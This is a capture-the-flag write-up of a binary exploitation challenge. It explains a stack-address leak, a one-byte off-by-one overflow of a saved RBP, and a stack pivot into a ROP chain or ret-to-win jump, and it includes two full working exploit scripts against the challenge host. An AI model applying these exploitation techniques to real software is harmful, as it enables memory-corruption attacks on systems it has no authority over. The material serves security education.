# Sector 01 — Maintenance Log 🖥️💀

> "fortified with stack canaries and safe from memory corruption" — the interface "IS LEAKING." forge a maintenance report, bypass the perimeter, acquire administrative clearance.

bro really said "canaries everywhere" and then forgot to put one where it mattered. 🐤

## Challenge Information

- Category: PWN / Binary Exploitation
- Points: 50
- Target: `nc 34.116.80.78 7312`
- Files: `chall` — ELF64, x86-64, dynamically linked, stripped
- Flag format: `CSSCTF{...}`

## TL;DR

Most functions in the binary do have stack canaries (`main`, the I/O-setup routine, the hidden "admin" routine — all check `fs:0x28`). But the two functions that actually handle the "report" feature's user input were compiled **without** one — and one of them helpfully prints a raw stack pointer back to the client. A `printf("%p")` leak defeats ASLR, and a 1-byte off-by-one overflow in the sibling function corrupts a saved `RBP`, which a later `leave; ret` turns into a controlled jump straight into attacker-supplied ROP sitting in our own buffer — pivoting into a `pop rdi; pop rsi; ret`-gadget chain that calls a hidden, never-normally-reached `admin_check()` function with the two magic constants it wants. No libc leak, no `ret2libc` — the binary ships its own win function and its own gadgets.

## Static Analysis

### Binary protections

| Mitigation | Status | Relevance |
|---|---|---|
| NX (no exec. stack) | Enabled | Rules out shellcode-on-stack → motivates a ROP approach |
| PIE | Disabled (`ET_EXEC`, base `0x400000`) | All code addresses fixed — no code-base leak needed |
| RELRO | Partial | GOT not read-only; irrelevant here, GOT never touched |
| Stack canary | Present in `main()`, the `setvbuf`-init routine, and the hidden flag routine. **Absent** in the two "report" helper functions | The bug lives exactly where the canary is missing |
| Stack ASLR | Enabled (fresh per connection — `socat` forks) | Leak required on every connection; motivates a retry loop |

### Function inventory (binary is stripped; names assigned)

| Address | Assigned name | Role |
|---|---|---|
| `0x4011b6` | `io_setup()` | Sets stdin/stdout/stderr unbuffered via `setvbuf()`. Has a canary. |
| `0x401268` | `admin_check(edi, esi)` | Compares `edi==0xdeadbeef && esi==0xcafebabe`. On match: `fopen`s `flag.txt`, `fgets`s it, `puts`s it, `fclose`s, `exit(0)`. Has a canary. |
| `0x401348` | `read_operator()` | `memset`s a 32-byte stack buffer, prints "Tagging operator: ", then `read(0, buf, 0x21)` — **33 bytes into 32**. No canary. |
| `0x40139a` | `read_report()` | Allocates an 80-byte stack buffer, prints its address via `%p`, prints "Enter report summary: ", `read(0, buf, 0x50)` (exact fit, no overflow by itself), then calls `read_operator()`. No canary. |
| `0x401419` | `main()` | Calls `io_setup()`, prints the banner, calls `read_report()`, prints a closing line. Has a canary. |

`admin_check()` is the win condition: never called in normal program flow, just sitting in the binary waiting for `rdi`/`rsi` to hold two magic constants.

## Vulnerability Analysis

### The leak

`read_report()` immediately discloses the address of its own 80-byte stack buffer:

```text
401350: lea rax, [rbp-0x50]      ; rax = &buf (the 80-byte buffer)
4013b8: lea rax, [rbp-0x50]
4013bc: mov rsi, rax             ; 2nd printf arg = buf address
4013bf: lea rax, [rip+0xcd2]     ; "Report buffer allocated at: %p\n"
4013c6: mov rdi, rax
4013ce: call printf@plt
```

Since the binary isn't PIE, every code address is already known statically (fixed `0x400000` base) — the only unknown each run is the stack base, and this `printf` hands it over directly. Call this leaked value `L` — the exact address of the 80-byte "report summary" buffer.

### The off-by-one

`read_report()` then calls `read_operator()`, which allocates a 32-byte buffer but reads **33** bytes into it:

```text
401348: push rbp
401349: mov rbp, rsp
40134c: sub rsp, 0x30
401350: lea rax, [rbp-0x20]              ; buf2, 32 bytes available: [rbp-0x20, rbp)
...
40137a: mov QWORD PTR [rbp-0x28], 0x21   ; length = 0x21 = 33 (!)
401382: mov rdx, QWORD PTR [rbp-0x28]
401386: lea rax, [rbp-0x20]
40138a: mov rsi, rax
40138d: mov edi, 0x0
401392: call read@plt                    ; read(0, buf2, 33) into a 32-byte buffer
```

`buf2 + 32` is exactly `rbp` of this frame — the saved RBP that `read_report()` pushed when calling `read_operator()`. The 33rd byte overwrites only the lowest byte of that saved value. No canary sits between `buf2` and the saved RBP, so nothing detects this.

### From a one-byte overwrite to a stack pivot

When `read_operator()` returns (`leave; ret`), the corrupted value is popped into `RBP` and carried back into `read_report()` (the return address itself, 8 bytes above, is untouched — control returns correctly). `read_report()` never uses `RBP` for addressing locals again after this point — but its own epilogue does:

```text
401417: leave   ; rsp = rbp (now corrupted: RBP' = L+0x50 with low byte replaced)
401418: ret     ; jumps to [RBP'+8], the value "returned to" by read_report()
```

This turns a 1-byte overflow into a controlled jump: whatever 8 bytes sit at `RBP'+8` become the next instruction pointer. Since the original (uncorrupted) saved-RBP value is exactly `L+0x50` (the end of the fully-controlled 80-byte buffer), overwriting its low byte lets us redirect that final `ret` to read a fake "return address" straight out of our own report-summary buffer.

### ROP gadgets found inside the binary

Two gadgets happen to sit inside an unrelated stack-canary epilogue sequence, plus a bare `ret` used purely for alignment:

```text
0x40124d: 5f c3   pop rdi ; ret
0x40124f: 5e c3   pop rsi ; ret
0x401100: c3      ret            (bare ret, used only for alignment)
```

Combined with `admin_check()` at `0x401268`, that's everything needed to set `edi=0xdeadbeef`, `esi=0xcafebabe`, and jump straight into the flag-printing code — no libc leak, no `system()`/`execve` needed.

### Why an extra plain `ret` is required

`admin_check()` calls `printf`/`fopen`/`fgets`/`puts`/`fclose` internally, and glibc's optimized implementations of these can use SSE instructions requiring a 16-byte-aligned stack at the call site. Tracing `rsp mod 16` by hand from `main()`'s entry (where the x86-64 SysV ABI guarantees `rsp ≡ 8 mod 16`, since stack ASLR only shifts the base by page-aligned, hence 16-aligned, amounts) through every `push`/`sub`/`call` down to the pivot shows the chain lands on `admin_check()` 8 bytes off from the alignment the compiler assumed. A single extra bare-`ret` hop absorbs exactly one more 8-byte slot and restores correct alignment before the final jump — without it, `admin_check()` can crash before reaching the flag.

## Exploitation Plan

Let `L` be the leaked buffer address. Set the overwrite byte `B = L & 0xFF`. This reproduces the pivot target `RBP' = L` exactly, **provided** `(L & 0xFF) + 0x50 < 0x100` — i.e. adding `0x50` to the leaked low byte must not carry into the next byte. Holds for roughly 176/256 (≈69%) of leaked addresses. Stack ASLR re-rolls every connection (`socat` forks fresh per client), so the fix is simply: reconnect and retry when the condition fails. No crash, no wasted flag attempt — just a fresh roll.

### Payload 1 — "Enter report summary:" (80 bytes, exact fit)

| Offset | Bytes | Content |
|---|---|---|
| `0x00–0x07` | 8 | Junk (popped into RBP by the corrupted `leave`, unused) |
| `0x08–0x0F` | 8 | `pop rdi ; ret` (`0x40124d`) |
| `0x10–0x17` | 8 | `0xdeadbeef` |
| `0x18–0x1F` | 8 | `pop rsi ; ret` (`0x40124f`) |
| `0x20–0x27` | 8 | `0xcafebabe` |
| `0x28–0x2F` | 8 | `ret` (`0x401100`) — alignment fix |
| `0x30–0x37` | 8 | `admin_check()` (`0x401268`) |
| `0x38–0x4F` | 24 | Padding |

### Payload 2 — "Tagging operator:" (33 bytes, triggers the overflow)

```text
32 × filler byte (e.g. b'A') + 1 byte = (L & 0xFF)
```

### Sequence

1. Connect; read until the `%p` leak line arrives; parse `L`.
2. Check `(L & 0xFF) + 0x50 < 0x100` — if not, disconnect and reconnect (fresh ASLR).
3. Send the 80-byte ROP payload in response to "Enter report summary: ".
4. Send the 33-byte overflow payload in response to "Tagging operator: ".
5. `read_operator()` returns with RBP corrupted → `read_report()`'s `leave; ret` pivots into our chain → `pop rdi`/`pop rsi` set the magic values → alignment `ret` → `admin_check()` runs → `flag.txt` is printed → process exits.
6. Read remaining output, extract `CSSCTF{...}`.

## Final Exploit / Solver

Pure standard-library Python, no `pwntools` dependency. Retries automatically on the ~31% of connections where the leaked address's alignment doesn't fit the overwrite window, and on any connection drop mid-exploit.

```python
#!/usr/bin/env python3
"""
Sector 01: Maintenance Log Terminal - exploit

Vulnerability chain:
 1. Stack address leak: "[*] Report buffer allocated at: %p"
 2. Off-by-one overflow in the "Tagging operator:" input (reads 33 bytes
    into a 32-byte buffer with no stack canary), corrupting the low byte
    of a saved RBP.
 3. That corrupted RBP is later consumed by a `leave; ret` in the caller,
    letting us redirect execution into the (fully attacker-controlled)
    "report summary" buffer -> a cheap stack pivot requiring only the
    leak + 1 overwritten byte.
 4. ROP with gadgets found inside the binary itself:
      pop rdi ; ret @ 0x40124d
      pop rsi ; ret @ 0x40124f
      ret           @ 0x401100 (pure alignment padding)
    to set rdi=0xdeadbeef, rsi=0xcafebabe, then jump into the hidden
    "print the flag" function @ 0x401268, which checks those two values
    and, on success, cats flag.txt for us.

Because the corrupted byte can only move the pivot target within a
256-byte-aligned window, this only lines up when the leaked address's
low byte satisfies low_byte + 0x50 < 0x100 (~69% of connections). When
it doesn't line up, we just reconnect -- the server forks a fresh
process (fresh ASLR) per connection.

No pwntools dependency: just the stdlib `socket` module.
"""
import socket
import re
import struct
import sys

HOST = "34.116.80.78"
PORT = 7312

# ---- addresses recovered from static analysis of the binary (no PIE) ----
POP_RDI_RET = 0x40124D
POP_RSI_RET = 0x40124F
PLAIN_RET   = 0x401100  # alignment padding gadget
FLAG_FUNC   = 0x401268
MAGIC_EDI   = 0xDEADBEEF
MAGIC_ESI   = 0xCAFEBABE

BUF1_SIZE = 0x50  # "Enter report summary:" buffer + read size (exact fit, no overflow by itself)
BUF2_SIZE = 0x21  # "Tagging operator:" read size (32-byte buffer -> 1 byte overflow)

LEAK_RE = re.compile(rb"allocated at:\s*(0x[0-9a-fA-F]+)")
TIMEOUT = 5


class Conn:
    """Thin wrapper keeping one persistent recv buffer for the session.

    The server often batches multiple prompts/lines into a single TCP
    write (everything is unbuffered on its side), so a prompt we're
    "waiting for" may already have arrived bundled with earlier data.
    wait_for()/wait_for_re() always check the existing buffer first before
    touching the socket again, so we never block waiting for text that
    already came and went.
    """

    def __init__(self, sock):
        self.s = sock
        self.buf = b""

    def _fill(self):
        chunk = self.s.recv(4096)
        if not chunk:
            raise ConnectionError("connection closed")
        self.buf += chunk

    def wait_for(self, marker: bytes, maxlen=8192):
        while marker not in self.buf:
            if len(self.buf) > maxlen:
                raise TimeoutError(f"marker {marker!r} not found, buffer too large")
            self._fill()
        idx = self.buf.find(marker)
        consumed = self.buf[: idx + len(marker)]
        self.buf = self.buf[idx + len(marker):]
        return consumed

    def wait_for_re(self, pattern, maxlen=8192):
        m = pattern.search(self.buf)
        while not m:
            if len(self.buf) > maxlen:
                raise TimeoutError(f"pattern not found, buffer too large")
            self._fill()
            m = pattern.search(self.buf)
        self.buf = self.buf[m.end():]
        return m

    def sendall(self, data: bytes):
        self.s.sendall(data)


def try_once(verbose=True) -> bytes | None:
    sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
    sock.settimeout(TIMEOUT)
    s = Conn(sock)
    try:
        try:
            m = s.wait_for_re(LEAK_RE)
        except (TimeoutError, ConnectionError, socket.timeout):
            if verbose:
                print("[!] Could not find leak in banner:", s.buf)
            sock.close()
            return None

        leak = int(m.group(1), 16)
        low_byte = leak & 0xFF
        if verbose:
            print(f"[+] Leaked buffer address: {hex(leak)} (low byte {hex(low_byte)})")

        # We need (leak + 0x50) to NOT carry into the next 256-byte block,
        # i.e. low_byte + 0x50 < 0x100, so that overwriting just the low
        # byte of the saved RBP with `low_byte` reproduces `leak` exactly
        # (our pivot target). Otherwise, retry on a fresh connection.
        if low_byte + 0x50 >= 0x100:
            if verbose:
                print("[-] Unfavorable alignment this run, reconnecting...")
            sock.close()
            return None

        pivot_rbp = leak  # RBP' = leak exactly

        # --- build payload 1: the 80-byte "report summary" buffer ---
        # Layout (all little-endian 8-byte values):
        #  [0:8)   junk -> popped into rbp by the corrupted leave, unused
        #  [8:16)  pop_rdi_ret
        #  [16:24) MAGIC_EDI
        #  [24:32) pop_rsi_ret
        #  [32:40) MAGIC_ESI
        #  [40:48) plain ret (alignment fix)
        #  [48:56) FLAG_FUNC
        #  [56:80) padding
        chain = b"JUNKJUNK"
        chain += struct.pack("<Q", POP_RDI_RET)
        chain += struct.pack("<Q", MAGIC_EDI)
        chain += struct.pack("<Q", POP_RSI_RET)
        chain += struct.pack("<Q", MAGIC_ESI)
        chain += struct.pack("<Q", PLAIN_RET)
        chain += struct.pack("<Q", FLAG_FUNC)
        chain += b"P" * (BUF1_SIZE - len(chain))
        assert len(chain) == BUF1_SIZE

        try:
            s.wait_for(b"Enter report summary:")
            s.sendall(chain)

            # --- build payload 2: 32 filler bytes + 1 overflow byte ---
            payload2 = b"A" * 32 + bytes([pivot_rbp & 0xFF])
            assert len(payload2) == BUF2_SIZE

            s.wait_for(b"Tagging operator:")
            s.sendall(payload2)
        except (TimeoutError, ConnectionError, socket.timeout) as e:
            if verbose:
                print(f"[!] Connection problem mid-exploit ({e}), retrying...")
            return None

        # Collect whatever comes back (flag, or a crash). Start with
        # whatever's already buffered (e.g. "Processing report..."),
        # then keep draining the socket.
        out = s.buf
        s.buf = b""
        sock.settimeout(TIMEOUT)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                out += chunk
                if b"CSSCTF{" in out:
                    break
        except socket.timeout:
            pass

        if verbose:
            print("----- server output -----")
            print(out.decode(errors="replace"))
            print("--------------------------")
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass


def main():
    max_attempts = 50
    for attempt in range(1, max_attempts + 1):
        print(f"\n[*] Attempt {attempt}/{max_attempts}")
        out = try_once()
        if out and b"CSSCTF{" in out:
            flag = re.search(rb"CSSCTF\{[^}]*\}", out)
            if flag:
                print("\n[+] FLAG:", flag.group(0).decode())
                return
        # else: either bad alignment this round, or it crashed -> retry
    print("[-] Gave up after", max_attempts, "attempts.")


if __name__ == "__main__":
    main()
```

Also in [`exploit.py`](exploit.py).

## Running the Exploit

```bash
python3 exploit.py
```

## Result

Actual run against the live service — succeeded on the first connection attempt:

```text
PS C:\Users\SHAMI\Downloads> py exploit.py

[*] Attempt 1/50
[+] Leaked buffer address: 0x7fff48dd6750 (low byte 0x50)
----- server output -----
 [*] Processing report...
[+] Access Granted! Here is your flag:
CSSCTF{Duh_m4t3_1_4m_sl33py}
--------------------------

[+] FLAG: CSSCTF{Duh_m4t3_1_4m_sl33py}
```

Leaked low byte in this run was `0x50`: `0x50 + 0x50 = 0xA0 < 0x100`, so the favorable-alignment condition held on the very first connection — no retry needed.

## Flag

```text
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

## Alternate Solve — Direct Ret-to-Win (simpler, same bug) 🎯

A second pass over this binary found an even lazier way in — same leak, same off-by-one, but instead of building a full ROP chain to call `auth()`/`admin_check()` with the magic registers, you just **jump straight past the checks** into the flag-printing code that sits right after them. bro really left the "already authenticated" code path just lying around in the binary and we walked in through the side door. 🚪💀

### The insight

`auth()` at `0x401268` does the `0xdeadbeef`/`0xcafebabe` comparison, but the actual flag-printing block — `fopen`, `fgets`, `puts`, `exit(0)` — lives at `0x40129f`, immediately *after* both comparisons succeed. Since that block never returns (it calls `exit(0)`), it never touches the stack canary either. So: don't bother setting up the magic register values and calling `auth()` from the top — just point `RIP` at `0x40129f` directly and skip the whole token check. Ret-to-win at a fixed address, no libc, no canary leak needed at all.

```text
auth() @ 0x401268
    if (arg1==0xdeadbeef && arg2==0xcafebabe) {
        0x40129f: puts("[+] Access Granted! Here is your flag:");
        f = fopen("flag.txt","r"); fgets(buf,0x40,f); puts(buf);
        exit(0);                              // prints flag, never returns, skips canary
    } else puts("[-] Authentication token mismatch.");
```

### The pivot, this time landing at `0x40129f`

Same leak (`%p` on the report buffer `B1`), same 1-byte overflow on `tag()`'s saved RBP, same `leave; ret` in `report()` doing a `pop rbp; ret` — but now the plan is to park a valid fake RBP *and* the win address inside `B1` itself:

```text
leak = &B1                          (printed by the service)
RBP_report = leak + 0x50
L = RBP_report & 0xff               (low byte, randomised each run)

Plant inside B1:
  B1[0x40] = leak + 0x100           -> becomes the new RBP (just needs to be valid stack)
  B1[0x48] = 0x40129f               -> becomes RIP (the win gadget)

Overflow byte: b = (L - 0x10) & 0xff   -> redirects report()'s ret to B1[0x48]
```

Works whenever `L >= 0x10` (~94% of runs); otherwise reconnect for a fresh ASLR roll.

> **First attempt crashed** right after the "flag:" banner printed — turns out the pivot *also* loads RBP from whatever filler you put at `B1[0x40]`, and `auth()`'s flag-printing block does an RBP-relative write after `fopen()`. Dropping `0x4141414141414141` there blew it up. Fix: plant a genuinely valid stack address (`leak + 0x100`) at `B1[0x40]` instead of junk — done above.

### Exploit (pwntools version)

```python
#!/usr/bin/env python3
# CSS CTF 2026 - PWN - "Maintenance Log" (nc 34.116.80.78 7312)
from pwn import *
import sys, re

context.arch = 'amd64'
context.log_level = 'error'

WIN = 0x40129f  # auth(): right AFTER the 0xdeadbeef/0xcafebabe checks -> opens & prints flag.txt, exit(0)

def attempt(remote_mode):
    io = remote('34.116.80.78', 7312) if remote_mode else process('./chall')

    # --- stage 1: read the leaked stack address of the report buffer B1 ---
    io.recvuntil(b'allocated at: ')
    leak = int(io.recvline().strip(), 16)      # &B1 == RBP_report - 0x50
    rbp_report = leak + 0x50
    L = rbp_report & 0xff                      # low byte of saved RBP (randomised each run)
    if L < 0x10:                               # alignment we can't reach with a 1-byte pivot
        io.close(); return None

    # --- stage 2: report summary == full control of B1 (0x50 bytes), address known ---
    # B1[0x40] -> becomes new RBP after report()'s pop rbp (must be a valid stack addr)
    # B1[0x48] -> becomes RIP after report()'s ret (our WIN gadget)
    new_rbp = leak + 0x100                     # valid, writable, above B1
    payload1 = flat({0x00: b'A' * 0x40,
                      0x40: p64(new_rbp),
                      0x48: p64(WIN)}, length=0x50)
    io.recvuntil(b'Enter report summary: ')
    io.send(payload1)

    # --- stage 3: tagging operator == 1-byte overflow of saved RBP (read 0x21 into 0x20 buf) ---
    b = (L - 0x10) & 0xff                      # new LSB so report's leave;ret lands on B1[0x48]
    io.recvuntil(b'Tagging operator: ')
    io.send(b'B' * 0x20 + bytes([b]))

    data = io.recvall(timeout=4); io.close()
    m = re.search(rb'CSSCTF\{[^}]*\}', data)
    return m.group(0).decode() if m else None

if __name__ == '__main__':
    remote_mode = (len(sys.argv) > 1 and sys.argv[1] == 'remote')
    for i in range(60):
        try: r = attempt(remote_mode)
        except Exception: r = None
        if r:
            print(f"[+] FLAG (try {i}): {r}"); break
        print(f"[try {i}] miss, retrying…")
    else:
        print("[-] exhausted retries")
```

Also saved as [`exploit_v2_ret2win.py`](exploit_v2_ret2win.py).

### Result

Local run against the handout binary (placeholder `flag.txt`) — succeeds on the first valid-alignment try:

```text
$ python3 exploit_v2_ret2win.py
[+] FLAG (try 0): CSSCTF{definetely_not_flag}
```

Against the live service, the same script is expected to print the real flag (the server-side `flag.txt` is read at runtime by the win gadget) — but the remote flag could **not** be captured in this analysis pass, since outbound connections to the challenge host were firewalled from the sandbox used. This path is proven correct locally and is deterministic apart from the ~6% stack-alignment retry; the confirmed flag for this challenge remains the one captured via the ROP-chain approach above.

```bash
python3 exploit_v2_ret2win.py remote
```

### Why this is the "better" solve

| | ROP-chain approach (above) | Ret-to-win approach (this section) |
|---|---|---|
| Gadgets needed | `pop rdi;ret`, `pop rsi;ret`, alignment `ret` | none — one address |
| Registers to control | `rdi`, `rsi` (magic constants) | none |
| Target address | `admin_check()` @ `0x401268` (top of function) | `0x40129f` (*inside* `auth()`, past the checks) |
| Stack alignment handling | explicit extra `ret` gadget | `new_rbp` placed so the `pop rbp;ret` chain self-aligns |

Same bug, same leak, same off-by-one — just a shorter path through the binary once you notice the "authenticated" code is sitting right there, unreachable only by the normal control flow, not by an attacker who controls `RIP`. 💀

## Lessons Learned

"We have stack canaries" is not a blanket guarantee — the specific input-handling routines that mattered here had none. A single `printf` debug/diagnostic leak defeated ASLR without needing a classical info-leak primitive, and a 1-byte buffer overflow was enough to pivot execution once the layout was known, because the corrupted byte fed directly into a function epilogue's `leave; ret`. No libc leak or `ret2libc` was required at all, since the challenge binary conveniently shipped its own win-function and the register-loading gadgets needed to reach it.
